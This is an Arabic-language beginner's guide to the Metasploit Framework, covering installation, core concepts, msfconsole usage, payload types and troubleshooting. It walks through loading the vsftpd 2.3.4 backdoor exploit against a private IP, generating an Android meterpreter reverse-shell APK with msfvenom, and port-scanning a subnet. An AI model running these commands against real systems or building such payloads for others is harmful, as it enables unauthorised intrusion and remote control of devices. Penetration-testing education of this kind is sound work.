# Metasploit Framework  
الدليل الأكاديمي الشامل لاستخدام أقوى منصة اختبار إختراق 

## مقدمة

Metasploit Framework هي منصة مفتوحة المصدر متكاملة لاختبار الاختراق، تُستخدم لاكتشاف الثغرات الأمنية واستغلالها بطريقة منظمة وأدوات متقدمة. تطورت Metasploit لتصبح أداة لا غنى عنها لكل مهندس أمن سيبراني أو مختبر اختراق محترف.

تكمن قوة Metasploit في:

- مكتبة ضخمة من الثغرات والاستغلالات (Exploits) الجاهزة
- أدوات مساعدة لبناء الحمولة (Payloads) وتقنيات التسلل
- واجهة تفاعلية (CLI وGUI) سهلة الاستخدام
- إمكانية الدمج مع أدوات أخرى لتعزيز الاختبارات الأمنية

## 1. تركيب Metasploit

### 1.1 على توزيعات لينكس (كالي، أوبونتو)

sudo apt update && sudo apt upgrade -y
sudo apt install metasploit-framework

 ملاحظة: في بعض التوزيعات قد تحتاج لتنزيل Metasploit من الموقع الرسمي أو بناءه من المصدر للحصول على أحدث نسخة



1.2 على Termux (أندرويد)

Metasploit غير متوفر رسميًا على Termux، لكن يمكن تثبيته عبر مشاريع خارجية مثل Termux-Metasploit:


pkg install unstable-repo
pkg install metasploit
msfconsole



2. المفاهيم الأساسية في Metasploit

المصطلح	الشرح

Exploit	كود يستغل ثغرة معينة لاختراق النظام أو التطبيق
Payload	الحمولة أو الكود الذي يُرسل بعد نجاح الاستغلال لتنفيذ مهام محددة (مثل فتح شل)
Module	وحدة في Metasploit، تشمل Exploits, Payloads, Auxiliaries
Listener (Handler)	عنصر يستمع لاتصالات قادمة من الجهاز المخترق
Session	الجلسة المفتوحة بعد نجاح الاستغلال



3. بنية Metasploit

Metasploit مقسمة إلى عدة مكونات رئيسية:

msfconsole: الواجهة النصية الأكثر استخدامًا

msfcli: واجهة سطر أوامر بسيطة.

msfvenom: أداة لتوليد الحمولة (Payload) بشكل مستقل

Modules: مكتبة ضخمة من وحدات الاستغلال والحمولات



4. بدء العمل مع Metasploit

4.1 تشغيل msfconsole

msfconsole

ستظهر واجهة تفاعلية يمكنك من خلالها البحث تحميل وضبط الوحدات

4.2 البحث عن Exploit

search type:exploit name:ftp

هذا يبحث عن كل الثغرات المتعلقة بـ FTP

4.3 اختيار Exploit وتحميله

use exploit/unix/ftp/vsftpd_234_backdoor

4.4 ضبط المتغيرات

show options

set RHOSTS 192.168.1.105
set RPORT 21
set PAYLOAD cmd/unix/interact

4.5 تنفيذ الاستغلال

exploit


5. أنواع الحمولة (Payloads)

Singles: حمولة مستقلة تنفذ مهمة واحدة مثل فتح شل.

Stagers: حمولة خفيفة تحضر الاتصال قبل تحميل الحمولة الكبيرة.

Stages: الحمولة الكبيرة التي تُرسل بعد Stager


6. msfvenom - توليد الحمولة

مثال لتوليد ملف شل مقلوب (Reverse Shell) لأندرويد:

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o shell.apk


7. استخدام Auxiliary Modules

هي أدوات مساعدة مثل فحص الشبكات، جمع المعلومات، وغيرها

مثال لفحص البورتات:

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run



8. إدارة الجلسات

عرض الجلسات المفتوحة:

sessions

الدخول إلى جلسة معينة:

sessions -i 1


9. نصائح مهمة

لا تستخدم Metasploit إلا بعد الحصول على إذن قانوني صريح

استغل قوة الأتمتة مع الحذر ولا تعتمد على الاستغلال الأوتوماتيكي فقط

راقب دائمًا استجابة النظام المستهدف

احفظ نتائج عملك وسجل التقدم




10. حل المشاكل الشائعة

10.1 مشكلة: msfconsole لا يعمل

تحقق من تثبيت Ruby بشكل صحيح

تحديث Metasploit:


msfupdate

10.2 مشكلة: أخطاء في الشبكة

تحقق من إعدادات جدار الحماية

تأكد من صحة IP والمنفذ

11. مصادر التعلم

الموقع الرسمي لـ Metasploit

كتاب "Metasploit: The Penetration Tester’s Guide"

قناة "NetworkChuck" على يوتيوب

Rapid7 Community


خاتمة

Metasploit ليست مجرد أداة بل هي منصة متكاملة تجمع بين المعرفة التقنية والأدوات العملية لتمنحك القدرة على اختبار أمن الأنظمة بشكل احترافي إتقانها مفتاح لاحتراف الاختراق الأخلاقي
